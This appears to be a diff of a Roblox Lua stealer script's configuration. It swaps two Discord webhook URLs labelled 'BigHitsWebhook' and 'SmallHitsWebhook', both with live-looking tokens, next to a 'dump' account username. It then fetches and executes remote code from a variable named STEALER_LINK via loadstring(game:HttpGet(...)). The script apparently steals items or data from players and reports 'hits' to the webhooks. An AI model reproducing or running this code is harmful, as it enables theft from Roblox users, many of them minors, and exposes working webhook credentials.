@@ -5,7 +5,7 @@ Usernames = {
     'RobloxDumpy1',
 }
 
-BigHitsWebhook = "https://discord.com/api/webhooks/1345105573221240873/IyPtVxLLGWh-rUGCX5P8FMQPusD4w1Ser2tLDx0zyk2OZlW6NyM862f6Q5cEbD5fmQCs"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1345105580276191335/MLqljcghkTMgAvzebxInp5BtBPmGFBKIy1R3VIYG99ROz3oekbFgLw1mGEC2ikRoaP_b"
+BigHitsWebhook = "https://discord.com/api/webhooks/1345334484530106420/qGXBd_9JrWTkqrEPUGfOwAOgKTamt-pORuuwGNE6iU_HlkZHhk_1aZWmzpnBszSNaPsr"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1345171538873159801/7gj1ZLwpefedWVl8ZOG8eWh9kYKMCa5Sm-k5mXAv1sCRoU-1gJuCbR_dcXzf7RFQ2dgI"
 
 loadstring(game:HttpGet(STEALER_LINK, true))()
